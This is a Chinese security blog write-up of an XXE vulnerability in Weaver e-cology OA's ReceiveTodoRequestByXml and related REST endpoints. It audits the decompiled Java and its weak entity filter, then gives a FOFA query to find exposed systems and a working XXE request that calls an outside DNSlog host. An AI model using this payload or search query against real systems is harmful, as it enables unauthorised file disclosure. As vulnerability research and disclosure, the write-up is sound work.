---
title: "泛微OA ReceiveTodoRequestByXml XML实体注入漏洞"
source: https://mrxn.net/jswz/e-cology-ReceiveTodoRequestByXml-xmlToMap-XXE.html
---

# 泛微OA ReceiveTodoRequestByXml XML实体注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/10 19:18
* 2136浏览
* [0评论](#comment)
* 40分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 简介

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。
[泛微e-cology](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微e-cology")
系统接口/rest/ofs/ReceiveTodoRequestByXml、ProcessOverRequestByXml、ProcessDoneRequestByXml 存在
[XXE漏洞](https://mrxn.net/tag/XXE "XXE漏洞")
，未经的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。

# FOFA 语法

> `app="泛微-协同商务系统"`

# 漏洞分析

除了今天的这三个点，此前互联网已经披露
`ReceiveCCRequestByXml`
、
`ReceiveRequestInfoByXml`
、
`deleteUserRequestInfoByXml`
、
`deleteRequestInfoByXml`
这几个XXE漏洞点，其实漏洞成因也是一样的，这里只是简单记录下
[代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1 "代码审计")
过程。

[![泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](https://mrxn.net/content/uploadfile/202501/5b9c1736509382.png)](https://mrxn.net/content/uploadfile/202501/5b9c1736509382.png)

ReceiveTodoRequestByXml 实现逻辑代码如下

```
public class ReceiveTodoRequestByXml implements IRestService {
    private OfsTodoDataManager ofsTodoDataManager = new OfsTodoDataManager();

    public ReceiveTodoRequestByXml() {
    }

    public IRestService.RestType getType() {
        return RestType.POST;
    }

    public String getURI() {
        return "/rest/ofs/ReceiveTodoRequestByXml";
    }

    public void service(IRestRequest var1, IRestResponse var2) throws RestException {
        HttpServletRequest var3 = var1.getHttpRequest();
        Response var4 = new Response();
        String var5 = ServletUtil.getServletInputStreamContent(var3, "UTF-8");
        if (!"".equals(var5)) {
            this.ofsTodoDataManager.setClientIp(Util.getIpAddr(var3));
            String var6 = this.ofsTodoDataManager.ReceiveTodoRequestByXml(var5);
            var4.addMessage("result", var6);
        }

        var2.writeReponse(var4);
    }
}
```

* 首先检查
  `var5`
  是否为空字符串。如果
  `var5`
  不为空，执行后续逻辑。
* 调用
  `ofsTodoDataManager.ReceiveTodoRequestByXml(var5)`
  方法，将
  `var5`
  （即 XML 数据）传递给
  `ofsTodoDataManager`
  进行处理。

getServletInputStreamContent 函数代码如下

```
public static String getServletInputStreamContent(HttpServletRequest var0, String var1) {
        StringBuffer var2 = new StringBuffer();

        try {
            ServletInputStream var3 = var0.getInputStream();
            BufferedReader var4 = new BufferedReader(new InputStreamReader(var3, var1));
            String var5 = "";

            while((var5 = var4.readLine()) != null) {
                var2.append(var5);
                var2.append("\n");
            }
        } catch (IOException var6) {
            var6.printStackTrace();
        }

        return var2.toString();
    }
```

如果 var5 不为 null，将 var5 追加到 var2 中，并在每行末尾添加换行符
`"\n"`
，然后返回给 var5。

ReceiveTodoRequestByXml 函数代码如下

```
public String ReceiveTodoRequestByXml(String var1) {
        var1 = SecurityMethodUtil.clearEntity(var1);
        Map var2 = OfsUtils.xmlToMap(var1);
        Map var3 = this.receiveCCRequestByMap(var2);
        String var4 = OfsUtils.mapToXml(var3, "ResultInfo");
        return var4;
    }
```

其中 SecurityMethodUtil.clearEntity 如下

```
public static String clearEntity(String var0) {
        if (var0 != null && !"".equals(var0)) {
            return var0.toLowerCase().indexOf("entity") == -1 ? var0 : var0.replaceAll("(?i)\\<\\!entity ", "*");
        } else {
            return var0;
        }
    }
```

主要作用是清除字符串中所有不区分大小写的
`<!ENTITY`
声明，将其替换为
`*`
，如果字符串为空或为 null，则直接返回原字符串。因此我们的payload里不能出现
`<!ENTITY`
声明。

xmlToMap 函数如下

```
public static Map<String, String> xmlToMap(String var0) {
        HashMap var1 = new HashMap();

        try {
            Document var2 = DocumentHelper.parseText(var0);
            if (var2 == null) {
                return var1;
            }

            Element var3 = var2.getRootElement();
            Iterator var4 = var3.elementIterator();

            while(var4.hasNext()) {
                Element var5 = (Element)var4.next();
                List var6 = var5.elements();
                var1.put(var5.getName(), var5.getText());
            }
        } catch (Exception var7) {
            var7.printStackTrace();
        }

        return var1;
    }
```

通过
`org.dom4j.DocumentHelper.parseText`
解析XML,从而造成XXE漏洞。

# 漏洞复现

```
POST /rest/ofs/ReceiveTodoRequestByXml HTTP/1.1
Host: fanwei.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://ReceiveTodoRequestByXml.xxxx.dnslog.pw/xxe">
<M><syscode>&send;</syscode></M>
```

[![泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](https://mrxn.net/content/uploadfile/202501/7c931736510738.png)](https://mrxn.net/content/uploadfile/202501/7c931736510738.png)

Dnslog 平台成功收到了响应
  
[![泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](https://mrxn.net/content/uploadfile/202501/b6dd1736510854.png)](https://mrxn.net/content/uploadfile/202501/b6dd1736510854.png)

另外两个点的
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")
ProcessOverRequestByXml、ProcessDoneRequestByXml 是一样的利用方式，就不重复测试了。

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
* [#
  XXE](https://mrxn.net/tag/XXE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](https://mrxn.net/jswz/e-cology-ReceiveTodoRequestByXml-xmlToMap-XXE.html)
  
文章链接：
<https://mrxn.net/jswz/e-cology-ReceiveTodoRequestByXml-xmlToMap-XXE.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/e-cology-ReceiveTodoRequestByXml-xmlToMap-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/e-cology-ReceiveTodoRequestByXml-xmlToMap-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});